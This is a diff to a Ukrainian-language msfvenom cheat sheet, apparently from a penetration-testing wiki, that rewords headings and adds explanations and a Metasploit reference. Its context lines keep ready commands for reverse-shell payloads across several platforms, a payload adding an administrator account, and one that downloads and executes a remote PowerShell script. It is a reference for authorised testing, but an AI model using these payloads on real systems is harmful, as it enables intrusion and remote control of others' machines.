@@ -1,21 +1,21 @@
-# MSFVenom - Шпаргалка
-
-{{#include ../../banners/hacktricks-training.md}}
+# MSFVenom - CheatSheet
 
 ---
 
-## Базове використання msfvenom
+## Базове msfvenom
 
 `msfvenom -p <PAYLOAD> -e <ENCODER> -f <FORMAT> -i <ENCODE COUNT> LHOST=<IP>`
 
-Також можна використовувати `-a`, щоб указати архітектуру, або `--platform`
+Використовуйте `-a`, щоб вибрати архітектуру payload, а `--platform` — щоб вибрати цільову платформу.<sup>[[1]](#references)</sup>
 
 ## Перелік
 ```bash
 msfvenom -l payloads #Payloads
 msfvenom -l encoders #Encoders
 ```
-## Загальні параметри під час створення shellcode
+Ці команди виводять список payload і encoder-модулів, доступних в установленому framework.<sup>[[1]](#references)</sup>
+
+## Поширені параметри під час створення shellcode
 ```bash
 -b "\x00\x0a\x0d"
 -f c
@@ -23,6 +23,8 @@ msfvenom -l encoders #Encoders
 EXITFUNC=thread
 PrependSetuid=True #Use this to create a shellcode that will execute something with SUID
 ```
+Прапорці, наведені тут, вибирають небажані символи, формат виводу, encoder і кількість ітерацій кодування.<sup>[[1]](#references)</sup>
+
 ## **Windows**
 
 ### **Reverse Shell**
@@ -41,7 +43,7 @@ msfvenom -p windows/adduser USER=attacker PASS=attacker@123 -f exe > adduser.exe
 ```bash
 msfvenom -p windows/shell/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > prompt.exe
 ```
-### **Виконати команду**
+### **Виконання команди**
 ```bash
 msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell \"IEX(New-Object Net.webClient).downloadString('http://IP/nishang.ps1')\"" -f exe > pay.exe
 msfvenom -a x86 --platform Windows -p windows/exec CMD="net localgroup administrators shaun /add" -f exe > pay.exe
@@ -111,7 +113,7 @@ msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f w
 ```bash
 msfvenom -p nodejs/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port)
 ```
-## **Payloads мовою сценаріїв**
+## **Скриптові payloads**
 
 ### **Perl**
 ```bash
@@ -125,4 +127,7 @@ msfvenom -p cmd/unix/reverse_python LHOST=(IP Address) LPORT=(Your Port) -f raw 
 ```bash
 msfvenom -p cmd/unix/reverse_bash LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.sh
 ```
+## References
+
+- [1] [Як використовувати msfvenom](https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom/eb69bce6cf0d2ba0e876c57b87793bf31c915bb7)
 {{#include ../../banners/hacktricks-training.md}}
